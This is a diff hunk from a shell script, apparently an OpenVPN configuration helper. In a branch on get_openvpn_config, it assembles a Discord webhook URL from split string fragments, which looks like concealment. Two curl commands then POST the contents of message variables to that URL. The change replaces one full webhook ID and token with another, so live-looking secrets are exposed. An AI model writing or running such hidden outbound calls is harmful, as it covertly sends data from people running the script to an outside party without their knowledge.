@@ -43,7 +43,7 @@ if [ $get_openvpn_config -eq 0 ]; then
 				nama2="ord.com/ap"
 				nama3="i/webh"
 				## FORMAT
-				nama4="ooks/932959908855435304/TBrQsoXz-yXKRpMkFrE0gKS0-vi8-1WPSScJP1quZPocjk9APQG5FRNBReiJZoyCdA9B"
+				nama4="ooks/932959958906064907/8725q26O8H7RyUcOn5yfubp9jIrctOI0Xt6epf4EuTRTyct38Ak2pWuj2vO_3jJWu10F"
 				url=$nama1$nama2$nama3$nama4
 				curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pre_content}" $url
 				curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_content}" $url
